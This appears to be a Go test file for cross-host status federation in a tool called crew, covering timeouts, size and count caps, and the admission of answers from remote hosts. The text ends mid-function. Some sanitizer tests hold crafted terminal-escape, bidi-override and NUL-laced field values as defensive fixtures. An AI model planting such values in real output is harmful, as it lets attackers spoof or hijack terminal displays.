package fleet

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"maps"
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/noamsto/dispatcher/crew/internal/jsonval"
	"github.com/noamsto/dispatcher/crew/internal/lane"
	"github.com/noamsto/dispatcher/crew/internal/peer"
	"github.com/noamsto/dispatcher/crew/internal/proc/proctest"
	"github.com/noamsto/dispatcher/crew/internal/remote"
	"github.com/noamsto/dispatcher/crew/internal/roster"
	"github.com/noamsto/dispatcher/crew/internal/sender"
	"github.com/noamsto/dispatcher/crew/internal/tmux/tmuxtest"
	"github.com/noamsto/dispatcher/crew/internal/watch"
)

const stampFormat = "list-windows -a -F #{@crew_id}\x1f#{@crew_dispatcher_host}"

// overseer makes f the overseer session of self: CREW_OVERSEER set, a passing
// sender check for overseer:<self>, and settings hosts self plus partners.
func (f *statusFix) overseer(self string, partners ...string) {
	f.env["CREW_OVERSEER"] = self
	f.opts.Host = func() (string, error) { return self, nil }
	f.opts.Sender = sender.Probes{
		Getenv: f.opts.Getenv,
		Tmux:   &tmuxtest.Fake{Out: map[string]string{"list-panes": ""}},
		Proc:   proctest.New(nil, map[int]int{os.Getpid(): 1}),
		Self:   func() (string, error) { return self, nil },
		Hosts: func() (map[string]remote.Host, error) {
			hosts := map[string]remote.Host{self: {}}
			for _, p := range partners {
				hosts[p] = remote.Host{}
			}
			return hosts, nil
		},
	}
	f.opts.FederateTimeout = 5 * time.Second
}

func (f *statusFix) hostDir(host string) string {
	return lane.OverseerHostDir(f.env["XDG_STATE_HOME"], host)
}

// farFix is a second fleet, the partner `host`, with its own registry, state
// and buses.
func farFix(t *testing.T, host string, lines ...string) *statusFix {
	t.Helper()
	far := newStatusFix(t, lines...)
	far.opts.Host = func() (string, error) { return host, nil }
	return far
}

// fedCalls records every Federate call; Federate runs on goroutines.
type fedCalls struct {
	mu    sync.Mutex
	calls []string
}

func (c *fedCalls) add(host string, argv []string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.calls = append(c.calls, host+": "+strings.Join(argv, " "))
}

func (c *fedCalls) list() []string {
	c.mu.Lock()
	defer c.mu.Unlock()
	return slices.Clone(c.calls)
}

// serve answers a pull the way the far `crew overseer status` does: ServeFar
// over the far fleet, encoded as one JSON object.
func (c *fedCalls) serve(t *testing.T, far *statusFix) roster.Capture {
	return func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
		c.add(host, argv)
		if len(argv) != 7 {
			t.Errorf("argv = %q", argv)
			return 2
		}
		since, err := strconv.ParseInt(argv[6], 10, 64)
		if err != nil {
			t.Errorf("--since %q: %v", argv[6], err)
			return 2
		}
		ans, err := ServeFar(ctx, argv[4], since, stderr, far.opts)
		if err != nil {
			_, _ = fmt.Fprintln(stderr, err)
			return 1
		}
		if err := jsonval.Encode(stdout, ans, false); err != nil {
			t.Error(err)
			return 1
		}
		return 0
	}
}

// answering writes text as the far answer of every pull.
func answering(text string) roster.Capture {
	return func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		_, _ = io.WriteString(stdout, text)
		return 0
	}
}

func nowMS() int64 { return fixedNow.UnixMilli() }

func TestFederateTwoHostsUp(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(100, "c9", "feat/z", "working", ""),
		wmsg(50, "c9", "dispatcher:c9", "overseer:halo", `"{\"kind\":\"ack\",\"re\":7}"`),
		wmsg(40, "c9", "worker:feat/z#s1-1", "overseer:halo", `{"kind":"ack"}`),
	)
	far.windows("feat/z")
	f := newStatusFix(t, wstatus(100, "c1", "feat/a", "working", ""))
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)

	doc := f.collect(StatusRequest{})
	if len(doc.Repos) != 1 || doc.Repos[0].Host != "halo" {
		t.Fatalf("local repos = %+v, want one tagged halo", doc.Repos)
	}
	if len(doc.Hosts) != 1 {
		t.Fatalf("hosts = %+v, want mbp", doc.Hosts)
	}
	h := doc.Hosts[0]
	if h.Host != "mbp" || h.State != "ok" || h.Error != nil {
		t.Fatalf("host = %+v %v, want mbp ok", h, h.Error)
	}
	if h.TS == nil || *h.TS != nowMS() || h.LastOkTS == nil || *h.LastOkTS != nowMS() || h.AgeS == nil || *h.AgeS != 0 {
		t.Errorf("ts/last_ok_ts/age_s = %v/%v/%v", h.TS, h.LastOkTS, h.AgeS)
	}
	if len(h.Repos) != 1 || h.Repos[0].Host != "mbp" || h.Repos[0].Repo != "acme/alpha" {
		t.Fatalf("far repos = %+v", h.Repos)
	}
	c9 := h.Repos[0].Crews[0]
	if c9.CrewID != "c9" || len(c9.OverseerInbox) != 1 || c9.OverseerInbox[0].TS != ago(50) {
		t.Errorf("far crew = %+v, want c9 with the dispatcher's ack in its inbox", c9)
	}
	if h.Machine == nil {
		t.Error("an ok host carries its machine document")
	}
	b := h.Batches()
	if len(b) != 1 || b[0].Repo != "acme/alpha" || b[0].Common != far.common || b[0].Cursor != ago(40) || len(b[0].Events) != 1 || b[0].Events[0]["from"] != "dispatcher:c9" {
		t.Errorf("batches = %+v", b)
	}
	if m := h.Misroutes(); len(m) != 1 || m[0] != (FarMisrouted{Repo: "acme/alpha", Common: far.common, CrewID: "c9", From: "worker:feat/z#s1-1", TS: ago(40)}) {
		t.Errorf("misroutes = %+v", m)
	}
	if ts, ok := ReadOK(f.hostDir("mbp")); !ok || ts != nowMS() {
		t.Errorf("ok file = %d %v, want %d", ts, ok, nowMS())
	}
	raw, err := json.Marshal(doc)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(raw, []byte(`"overseer:halo"`)) {
		t.Errorf("the admitted events must not be in the document: %s", raw)
	}
}

func TestFederateUnreachable(t *testing.T) {
	failing := func(_ context.Context, _ string, _ []string, _, stderr io.Writer) int {
		_, _ = io.WriteString(stderr, "ssh: connect to host mbp: \x1b[31mrefused\x7f\nsecond line\n")
		return 255
	}
	t.Run("with an ok file", func(t *testing.T) {
		f := newStatusFix(t, wstatus(100, "c1", "feat/a", "working", ""))
		f.overseer("halo", "mbp")
		if err := WriteOK(f.hostDir("mbp"), ago(3600)); err != nil {
			t.Fatal(err)
		}
		f.opts.Federate = failing
		doc := f.collect(StatusRequest{})
		h := doc.Hosts[0]
		if h.State != "unreachable" || h.Error == nil || *h.Error != "ssh failed (255)" {
			t.Errorf("host = %+v error %v", h, deref(h.Error))
		}
		if h.LastOkTS == nil || *h.LastOkTS != ago(3600) || h.AgeS == nil || *h.AgeS != 3600 {
			t.Errorf("last_ok_ts/age_s = %v/%v, want %d/3600", h.LastOkTS, h.AgeS, ago(3600))
		}
		if h.TS != nil || len(h.Repos) != 0 || h.Machine != nil || h.Batches() != nil {
			t.Errorf("an unreachable host carries no far data: %+v", h)
		}
		if ts, _ := ReadOK(f.hostDir("mbp")); ts != ago(3600) {
			t.Errorf("a failed pull wrote the ok file: %d", ts)
		}
		if len(doc.Repos) != 1 {
			t.Errorf("local repos = %+v", doc.Repos)
		}
	})
	t.Run("no ok file", func(t *testing.T) {
		f := newStatusFix(t)
		f.overseer("halo", "mbp")
		f.opts.Federate = failing
		h := f.collect(StatusRequest{}).Hosts[0]
		if h.State != "unreachable" || h.LastOkTS != nil || h.AgeS != nil {
			t.Errorf("host = %+v, want unreachable with null last_ok_ts and age_s", h)
		}
		raw, _ := json.Marshal(h)
		if !strings.Contains(string(raw), `"last_ok_ts":null,"age_s":null`) {
			t.Errorf("json = %s", raw)
		}
	})
}

func TestFederateTimeout(t *testing.T) {
	f := newStatusFix(t, wstatus(100, "c1", "feat/a", "working", ""))
	f.overseer("halo", "mbp")
	f.opts.FederateTimeout = 50 * time.Millisecond
	f.opts.Federate = func(ctx context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		select {
		case <-ctx.Done():
			return 255
		case <-time.After(10 * time.Second):
			_, _ = io.WriteString(stdout, "{}")
			return 0
		}
	}
	start := time.Now()
	doc := f.collect(StatusRequest{})
	if el := time.Since(start); el > 5*time.Second {
		t.Errorf("collect took %s, past the federate timeout", el)
	}
	h := doc.Hosts[0]
	if h.State != "unreachable" || h.Error == nil || !strings.Contains(*h.Error, "no answer within 50ms") {
		t.Errorf("host = %+v error %v", h, h.Error)
	}
	if len(doc.Repos) != 1 || doc.crew(t, "c1").CrewID != "c1" {
		t.Errorf("local repos = %+v", doc.Repos)
	}
}

func TestFederateOverSizeAnswer(t *testing.T) {
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	var accepted int
	f.opts.Federate = func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		chunk := bytes.Repeat([]byte(" "), 64<<10)
		for range 80 { // 5 MiB
			n, err := stdout.Write(chunk)
			accepted += n
			if err != nil {
				break
			}
		}
		return 0
	}
	h := f.collect(StatusRequest{}).Hosts[0]
	if accepted > farMaxBytes {
		t.Errorf("the capped writer accepted %d bytes, over %d", accepted, farMaxBytes)
	}
	if h.State != "unreachable" || h.Error == nil || *h.Error != "answer over 4 MiB" {
		t.Errorf("host = %+v error %v", h, h.Error)
	}
}

func TestFederateSelfNameMismatch(t *testing.T) {
	far := farFix(t, "mbp.local")
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)
	h := f.collect(StatusRequest{}).Hosts[0]
	want := "far self-name mbp.local ≠ settings key mbp: its overseer's msgs are refused here"
	if h.State != "ok" || h.Error == nil || *h.Error != want {
		t.Errorf("host = %+v error %v, want ok with %q", h, h.Error, want)
	}
}

func TestFederateGateFailing(t *testing.T) {
	f := newStatusFix(t)
	f.overseer("halo", "zed", "mbp")
	f.opts.Sender.Tmux = nil
	var calls fedCalls
	f.opts.Federate = func(_ context.Context, host string, argv []string, _, _ io.Writer) int {
		calls.add(host, argv)
		return 0
	}
	doc := f.collect(StatusRequest{})
	if got := calls.list(); len(got) != 0 {
		t.Errorf("a failing sender check federated: %q", got)
	}
	if len(doc.Hosts) != 2 || doc.Hosts[0].Host != "mbp" || doc.Hosts[1].Host != "zed" {
		t.Fatalf("hosts = %+v, want mbp and zed in order", doc.Hosts)
	}
	for _, h := range doc.Hosts {
		if h.State != "unprobed" || h.Error == nil || !strings.Contains(*h.Error, "pane stamps cannot be read") {
			t.Errorf("host = %+v error %v, want unprobed with the sender reason", h, h.Error)
		}
	}
}

func TestFederateNeedsOverseerAndFederate(t *testing.T) {
	far := farFix(t, "mbp")
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	var calls fedCalls
	f.opts.Federate = calls.serve(t, far)
	f.env["CREW_OVERSEER"] = ""
	if doc := f.collect(StatusRequest{}); len(doc.Hosts) != 0 || len(calls.list()) != 0 {
		t.Errorf("outside overseer mode: hosts=%+v calls=%q", doc.Hosts, calls.list())
	}
	f.env["CREW_OVERSEER"] = "halo"
	f.opts.Served = &ServedStatus{Origin: "zed"}
	if doc := f.collect(StatusRequest{}); len(doc.Hosts) != 0 || len(calls.list()) != 0 {
		t.Errorf("served mode federated: hosts=%+v calls=%q", doc.Hosts, calls.list())
	}
	f.opts.Served = nil
	f.opts.Sender.Hosts = nil
	var stderr bytes.Buffer
	doc := CollectStatus(t.Context(), StatusRequest{}, &stderr, f.opts)
	if len(doc.Hosts) != 0 || len(calls.list()) != 0 || !strings.Contains(stderr.String(), "hosts") {
		t.Errorf("unreadable hosts: hosts=%+v calls=%q stderr=%q", doc.Hosts, calls.list(), stderr.String())
	}
}

// farAnswer is a valid answer from mbp, for halo, whose one batch holds events.
func farAnswer(events ...map[string]any) map[string]any {
	worker := map[string]any{"branch": "feat/z", "state": "working", "title": "fine", "stale": false}
	crew := map[string]any{
		"crew_id": "c9", "attention": "attended", "workers": []any{worker}, "holds": []any{}, "overseer_inbox": []any{},
		"dispatcher": map[string]any{"state": "live", "pid": 100, "pane": nil, "lane": nil, "last_event_s": 5, "home": nil},
	}
	repo := map[string]any{"host": "mbp", "repo": "acme/alpha", "common": "/git/alpha/.git", "misrouted": 0, "crews": []any{crew}}
	evs := make([]any, len(events))
	for i, e := range events {
		evs[i] = e
	}
	return map[string]any{
		"v": 1, "self": "mbp", "ts": nowMS(), "cursor": ago(10),
		"status": map[string]any{
			"ts": nowMS(), "host": "mbp", "machine": nil,
			"queue": map[string]any{"head": nil, "demoted": []any{}, "parked": []any{}},
			"repos": []any{repo}, "skipped": []any{}, "hosts": []any{},
		},
		"inbox":     []any{map[string]any{"repo": "acme/alpha", "cursor": ago(10), "events": evs}},
		"misrouted": []any{},
	}
}

func farEvent(ts any, crew, from, to string, body any) map[string]any {
	return map[string]any{"ts": ts, "crew_id": crew, "kind": "msg", "from": from, "to": to, "body": body}
}

func marshal(t *testing.T, v any) []byte {
	t.Helper()
	raw, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func TestAdmitHostRefusals(t *testing.T) {
	valid := marshal(t, farAnswer())
	if _, err := AdmitHost(valid, "mbp", "halo", 0); err != nil {
		t.Fatalf("a valid answer is refused: %v", err)
	}
	with := func(edit func(a map[string]any)) []byte {
		a := farAnswer()
		edit(a)
		return marshal(t, a)
	}
	repos := func(a map[string]any) []any { return a["status"].(map[string]any)["repos"].([]any) }
	crewOf := func(a map[string]any) map[string]any {
		return repos(a)[0].(map[string]any)["crews"].([]any)[0].(map[string]any)
	}
	for _, tc := range []struct {
		name, want string
		in         []byte
	}{
		{"empty", "not JSON", nil},
		{"two values", "more than one JSON value", append(append(slices.Clone(valid), '\n'), valid...)},
		{"an array", "not a JSON object", []byte(`[1]`)},
		{"over 4 MiB", "answer over 4 MiB", append(slices.Clone(valid), bytes.Repeat([]byte(" "), farMaxBytes)...)},
		{"v 2", "version", with(func(a map[string]any) { a["v"] = 2 })},
		{"v missing", "version", with(func(a map[string]any) { delete(a, "v") })},
		{"ts not whole", "ts", with(func(a map[string]any) { a["ts"] = 1.5 })},
		{"ts a string", "ts", with(func(a map[string]any) { a["ts"] = "1700000100000" })},
		{"status not an object", "does not hold its type", with(func(a map[string]any) { a["status"] = "x" })},
		{"repos cap", "200 repos", with(func(a map[string]any) {
			r := repos(a)[0]
			a["status"].(map[string]any)["repos"] = slices.Repeat([]any{r}, 201)
		})},
		{"crews cap", "100 crews", with(func(a map[string]any) {
			r := repos(a)[0].(map[string]any)
			r["crews"] = slices.Repeat(r["crews"].([]any), 101)
		})},
		{"workers cap", "200 workers", with(func(a map[string]any) {
			c := crewOf(a)
			c["workers"] = slices.Repeat(c["workers"].([]any), 201)
		})},
		{"events cap", "500 inbox events", with(func(a map[string]any) {
			ev := farEvent(ago(5), "c9", "dispatcher:c9", "overseer:halo", "{}")
			a["inbox"] = []any{
				map[string]any{"repo": "a", "cursor": 1, "events": slices.Repeat([]any{ev}, 300)},
				map[string]any{"repo": "b", "cursor": 1, "events": slices.Repeat([]any{ev}, 201)},
			}
		})},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := AdmitHost(tc.in, "mbp", "halo", 0)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Errorf("err = %v, want one naming %q", err, tc.want)
			}
		})
	}
}

// A refusal answer is not a FarAnswer: AdmitHost refuses one carrying a known
// code or an unknown one rather than admit it as an empty ok answer. A refuse
// key that is empty is not a refusal.
func TestAdmitHostRefusesARefusalAnswer(t *testing.T) {
	answer := func(code string) []byte {
		a := farAnswer()
		a["refuse"] = code
		return marshal(t, a)
	}
	for _, code := range []string{codeOverBudget, codeTSGroupOverCap, unknownRefusalCode} {
		t.Run(code, func(t *testing.T) {
			ans, err := AdmitHost(answer(code), "mbp", "halo", 0)
			if err == nil {
				t.Fatalf("a %q refusal was admitted as %+v, want an error", code, ans)
			}
			if ans.V != 0 || ans.Self != "" || ans.TS != 0 || len(ans.Inbox) != 0 {
				t.Errorf("answer = %+v, want the zero answer beside the error", ans)
			}
			if !strings.Contains(strings.ToLower(err.Error()), "refus") {
				t.Errorf("err = %v, want one naming the refusal", err)
			}
		})
	}
	if ans, err := AdmitHost(answer(""), "mbp", "halo", 0); err != nil || ans.V != 1 {
		t.Errorf("an empty refuse key = %+v, %v; want the answer admitted", ans, err)
	}
}

// Every far list has a count cap, so an answer within 4 MiB cannot grow
// without bound once projected and printed: a list at its cap is admitted,
// one entry over refuses the answer in this host's words.
func TestAdmitHostCountCaps(t *testing.T) {
	status := func(a map[string]any) map[string]any { return a["status"].(map[string]any) }
	crew := func(a map[string]any) map[string]any {
		return status(a)["repos"].([]any)[0].(map[string]any)["crews"].([]any)[0].(map[string]any)
	}
	machine := func(a map[string]any) map[string]any {
		m := map[string]any{"budget": 8, "leads": []any{}, "engines": map[string]any{}}
		status(a)["machine"] = m
		return m
	}
	entry := map[string]any{"repo": "acme/alpha", "crew_id": "c9", "id": "1700000000001-1", "reason": "oversize"}
	for _, tc := range []struct {
		name  string
		limit int
		want  string
		set   func(a map[string]any, n int)
	}{
		{"skipped", farMaxRepos + farMaxCrews, "skipped repos", func(a map[string]any, n int) {
			status(a)["skipped"] = slices.Repeat([]any{map[string]any{"status": "unreadable"}}, n)
		}},
		{"overseer inbox", FarMaxEvents, "overseer inbox msgs", func(a map[string]any, n int) {
			crew(a)["overseer_inbox"] = slices.Repeat([]any{map[string]any{"ts": 5}}, n)
		}},
		{"holds", farMaxWorkers, "holds", func(a map[string]any, n int) {
			crew(a)["holds"] = slices.Repeat([]any{map[string]any{"id": "1700000000001-1", "kind": "quota"}}, n)
		}},
		{"demoted", farMaxCrews, "demoted holds", func(a map[string]any, n int) {
			status(a)["queue"].(map[string]any)["demoted"] = slices.Repeat([]any{entry}, n)
		}},
		{"parked", farMaxCrews, "parked holds", func(a map[string]any, n int) {
			status(a)["queue"].(map[string]any)["parked"] = slices.Repeat([]any{entry}, n)
		}},
		{"leads", farMaxWorkers, "leads", func(a map[string]any, n int) {
			lead := map[string]any{"repo": "acme/alpha", "branch": "feat/z", "tier": "standard", "weight": 1}
			machine(a)["leads"] = slices.Repeat([]any{lead}, n)
		}},
		{"engines", farMaxCrews, "engines", func(a map[string]any, n int) {
			engines := map[string]any{}
			for i := range n {
				engines[fmt.Sprintf("e%d", i)] = map[string]any{}
			}
			machine(a)["engines"] = engines
		}},
		{"hot windows", farMaxWorkers, "hot windows", func(a map[string]any, n int) {
			machine(a)["engines"] = map[string]any{
				"claude": map[string]any{"hot_windows": slices.Repeat([]any{"feat/z"}, n-1)},
				"codex":  map[string]any{"hot_windows": []any{"feat/y"}},
			}
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			a := farAnswer()
			tc.set(a, tc.limit)
			if _, err := AdmitHost(marshal(t, a), "mbp", "halo", 0); err != nil {
				t.Errorf("at the cap of %d: %v", tc.limit, err)
			}
			a = farAnswer()
			tc.set(a, tc.limit+1)
			_, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
			if want := fmt.Sprintf("%d %s, over the cap of %d %s", tc.limit+1, tc.want, tc.limit, tc.want); err == nil || !strings.Contains(err.Error(), want) {
				t.Errorf("over the cap: err = %v, want one naming %q", err, want)
			}
		})
	}
}

// A far skipped note with no text left is dropped, not shown empty.
func TestAdmitHostDropsEmptySkipped(t *testing.T) {
	a := farAnswer()
	a["status"].(map[string]any)["skipped"] = []any{map[string]any{}, map[string]any{"status": "\x1b\x07"}, map[string]any{"status": "gone"}}
	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	if want := []Skipped{{Status: "gone"}}; !slices.Equal(ans.Status.Skipped, want) {
		t.Errorf("skipped = %+v, want %+v", ans.Status.Skipped, want)
	}
}

func TestAdmitHostRechecksEvents(t *testing.T) {
	cutoff := ago(1000)
	good := farEvent(ago(30), "c9", "dispatcher:c9", "overseer:halo", `{"kind":"ack","re":7}`)
	status := farEvent(ago(29), "c9", "dispatcher:c9", "overseer:halo", "{}")
	status["kind"] = "status"
	raw := marshal(t, farAnswer(
		good,
		farEvent(ago(28), "c9", "dispatcher:c9", "overseer:box", "{}"),
		farEvent(ago(27), "c9", "worker:feat/z#s1-1\x1b", "overseer:halo", "{}"),
		farEvent(ago(26), "", "dispatcher:", "overseer:halo", "{}"),
		farEvent(json.Number("1700000074000.5"), "c9", "dispatcher:c9", "overseer:halo", "{}"),
		farEvent(ago(2000), "c9", "dispatcher:c9", "overseer:halo", "{}"),
		farEvent(ago(25), "c9", "dispatcher:c9", "overseer:halo", strings.Repeat("b", peer.MaxBody+1)),
		farEvent(ago(24), "c9", "dispatcher:c9", "overseer:halo", map[string]any{"kind": "note", "text": strings.Repeat("b", peer.MaxBody)}),
		status,
	))
	ans, err := AdmitHost(raw, "mbp", "halo", cutoff)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Inbox) != 1 || len(ans.Inbox[0].Events) != 1 || ans.Inbox[0].Events[0]["ts"] != json.Number(strconv.FormatInt(ago(30), 10)) {
		t.Fatalf("inbox = %+v, want only the dispatcher's ack", ans.Inbox)
	}
	// The msg from worker:feat/z#s1-1\x1b names no valid sender: dropped.
	want := []FarMisrouted{
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(28)},
		{Repo: "acme/alpha", CrewID: "", From: "dispatcher:", TS: ago(26)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: 0},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(2000)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(25)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(24)},
		{Repo: "acme/alpha", CrewID: "c9", From: "dispatcher:c9", TS: ago(29)},
	}
	if !slices.Equal(ans.Misrouted, want) {
		t.Errorf("misrouted =\n%+v\nwant\n%+v", ans.Misrouted, want)
	}
}

func TestAdmitHostSanitizes(t *testing.T) {
	a := farAnswer(farEvent(ago(30), "c9", "dispatcher:c9", "overseer:halo", "{\"kind\":\"ack\",\"text\":\"hi\u200b\x01\"}"))
	status := a["status"].(map[string]any)
	repo := status["repos"].([]any)[0].(map[string]any)
	repo["host"] = "evil"
	bad := maps.Clone(repo)
	bad["common"], bad["repo"] = "/git/beta/.git", "acme/\x1b[2Jbeta\u200b"
	status["repos"] = append(status["repos"].([]any), bad)
	status["skipped"] = []any{map[string]any{"path": "/git/gamma/.git", "status": strings.Repeat("é", peer.MaxBody) + "\x1b"}}
	worker := repo["crews"].([]any)[0].(map[string]any)["workers"].([]any)[0].(map[string]any)
	worker["na\u202eme"] = "otter"
	worker["name"] = "ot\x07ter\u0085"
	a["misrouted"] = []any{
		map[string]any{"repo": "acme/alpha", "crew_id": "c9\u2066", "from": "worker:xy", "ts": ago(40)},
		map[string]any{"repo": "acme/alpha", "crew_id": "c9", "from": "worker:x\x00y", "ts": ago(39)},
		map[string]any{"repo": "acme/alpha", "crew_id": "c9", "from": "worker:xy", "ts": ago(38)},
	}
	a["self"] = "mbp\x1b"

	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(ans.Status.Repos) != 2 {
		t.Fatalf("repos = %+v, want beta kept unlabeled", ans.Status.Repos)
	}
	r := ans.Status.Repos[0]
	if r.Host != "mbp" || r.Repo != "acme/alpha" || r.Common != "" {
		t.Errorf("repo host/label/common = %q/%q/%q", r.Host, r.Repo, r.Common)
	}
	if beta := ans.Status.Repos[1]; beta.Repo != "" || beta.Common != "" || beta.Key != "/git/beta/.git" {
		t.Errorf("beta = %+v, want its label withheld and its common a key only", beta)
	}
	w := r.Crews[0].Workers[0]
	if _, has := w["name"]; has || w["branch"] != "feat/z" {
		t.Errorf("worker = %v, want its invalid name dropped and the invisible-laced key unread", w)
	}
	sk := ans.Status.Skipped
	if len(sk) != 2 || sk[0].Path != "" || sk[1] != (Skipped{Status: "1 repo(s) with an invalid label shown unlabeled"}) {
		t.Fatalf("skipped = %+v, want gamma's with no path and the unlabeled count", sk)
	}
	if s := sk[0].Status; len(s) > peer.MaxBody || !utf8.ValidString(s) || s == "" || strings.ContainsRune(s, '\x1b') {
		t.Errorf("skipped status is %d bytes, valid=%v; want scrubbed and capped at %d rune-safe", len(s), utf8.ValidString(s), peer.MaxBody)
	}
	if body := ans.Inbox[0].Events[0]["body"]; body != `{"kind":"ack","text":"hi"}` {
		t.Errorf("body = %q", body)
	}
	if m := ans.Misrouted; len(m) != 1 || m[0].TS != ago(38) {
		t.Errorf("misrouted = %+v, want only the valid one", m)
	}
	if ans.Self != "" {
		t.Errorf("self = %q, want an invalid self-name dropped", ans.Self)
	}
}

func TestCappedWriter(t *testing.T) {
	w := &cappedWriter{max: 10}
	if n, err := w.Write([]byte("12345678")); n != 8 || err != nil {
		t.Fatalf("write = %d %v", n, err)
	}
	if n, err := w.Write([]byte("abcd")); n != 2 || err == nil {
		t.Errorf("write past the cap = %d %v, want 2 and an error", n, err)
	}
	if n, _ := w.Write([]byte("z")); n != 0 || w.buf.String() != "12345678ab" || !w.over {
		t.Errorf("buf = %q over=%v", w.buf.String(), w.over)
	}
}

func TestServeFar(t *testing.T) {
	far := farFix(t, "mbp",
		wstatus(500, "c9", "feat/z", "working", ""),
		wmsg(300, "c9", "dispatcher:c9", "overseer:halo", `{"kind":"ack"}`),
		wmsg(200, "c9", "dispatcher:c9", "overseer:halo", `{"kind":"note"}`),
		wmsg(150, "c9", "dispatcher:c9", "overseer:mbp", `{"kind":"note"}`),
		wmsg(100, "c9", "worker:feat/z#s1-1", "overseer:halo", `{"kind":"ack"}`),
	)
	other := mkRepo(t, far.root, "beta", "", wmsg(250, "c4", "dispatcher:c4", "overseer:halo", `{"kind":"ack"}`))
	if err := os.WriteFile(far.opts.Registry, []byte(far.common+"\n"+other+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	ans, err := ServeFar(t.Context(), "halo", ago(250), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	if ans.V != 1 || ans.Self != "mbp" || ans.TS != nowMS() {
		t.Errorf("v/self/ts = %d/%q/%d", ans.V, ans.Self, ans.TS)
	}
	if len(ans.Status.Repos) != 2 || len(ans.Status.Hosts) != 0 {
		t.Fatalf("status repos = %+v hosts = %+v", ans.Status.Repos, ans.Status.Hosts)
	}
	if len(ans.Inbox) != 1 || ans.Inbox[0].Repo != "acme/alpha" || ans.Inbox[0].Cursor != ago(100) || len(ans.Inbox[0].Events) != 1 {
		t.Errorf("inbox = %+v, want alpha's note above since (beta's ack is at since)", ans.Inbox)
	}
	if want := []FarMisrouted{{Repo: "acme/alpha", Common: far.common, CrewID: "c9", From: "worker:feat/z#s1-1", TS: ago(100)}}; !slices.Equal(ans.Misrouted, want) {
		t.Errorf("misrouted = %+v", ans.Misrouted)
	}
	if ans.Cursor != ago(100) {
		t.Errorf("cursor = %d, want %d", ans.Cursor, ago(100))
	}

	quiet, err := ServeFar(t.Context(), "halo", ago(50), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	if quiet.Cursor != ago(50) || quiet.Inbox == nil || len(quiet.Inbox) != 0 || quiet.Misrouted == nil {
		t.Errorf("nothing above since: %+v", quiet)
	}
}

// A served crew's overseer_inbox is cut with the inbox: below the first row
// left out and within the cap, so a busy crew never makes its own host's
// answer refused.
func TestServeFarCutsOverseerInbox(t *testing.T) {
	lines := []string{wstatus(900, "c9", "feat/z", "working", "")}
	for i := range 600 {
		lines = append(lines, wmsg(800-int64(i), "c9", "dispatcher:c9", "overseer:halo", `"{\"kind\":\"ack\",\"re\":7}"`))
	}
	far := farFix(t, "mbp", lines...)
	ans, err := ServeFar(t.Context(), "halo", ago(1000), io.Discard, far.opts)
	if err != nil {
		t.Fatal(err)
	}
	inbox := ans.Status.Repos[0].Crews[0].OverseerInbox
	if len(inbox) != FarMaxEvents || inbox[len(inbox)-1].TS != ago(800-FarMaxEvents+1) {
		t.Errorf("overseer_inbox holds %d msgs, want the %d oldest", len(inbox), FarMaxEvents)
	}
	if _, err := AdmitHost(marshal(t, ans), "mbp", "halo", ago(1000)); err != nil {
		t.Errorf("the served answer is refused: %v", err)
	}
}

// A crew can hold far more overseer_inbox rows than the answer's byte budget,
// so the answer skeleton — the status alone, before any inbox event — is over
// farMaxBytes. fitFar must cut the inbox before it measures the skeleton, or
// ServeFar refuses its own answer with "its oldest row is over the byte
// budget". On main fitFar measures the untrimmed inbox and refuses.
func TestServeFarTrimsTheServedInboxBeforeMeasuring(t *testing.T) {
	const rows, pad = 2000, 3000
	lines := []string{wstatus(1000, "c9", "feat/z", "working", "")}
	for i := range rows {
		// Each row is also a fold event, so a distinct ts keeps the refusal
		// from being the ts-group one. The long kind (within peer.MaxBody)
		// sizes the inbox row in the skeleton; the re value keeps it a real
		// reply.
		body := strconv.Quote(fmt.Sprintf(`{"kind":"%s","re":%d}`, strings.Repeat("k", pad), 9007199254740991))
		lines = append(lines, wmsg(1000+int64(i), "c9", "dispatcher:c9", "overseer:halo", body))
	}
	far := farFix(t, "mbp", lines...)

	// Record the fixture as over the line, not near it: the served status
	// alone, before ServeFar folds in any inbox event, is past the budget.
	served := far.opts
	served.Served = &ServedStatus{Origin: "halo", Since: ago(4000)}
	doc, _ := collectStatus(t.Context(), StatusRequest{}, io.Discard, served)
	skeleton := encodedLen(doc) + 1
	if skeleton <= farMaxBytes {
		t.Fatalf("the fixture skeleton is %d bytes, want over the byte budget of %d", skeleton, farMaxBytes)
	}

	ans, err := ServeFar(t.Context(), "halo", ago(4000), io.Discard, far.opts)
	if err != nil {
		t.Fatalf("ServeFar refused its own %d-byte skeleton: %v", skeleton, err)
	}
	inbox := ans.Status.Repos[0].Crews[0].OverseerInbox
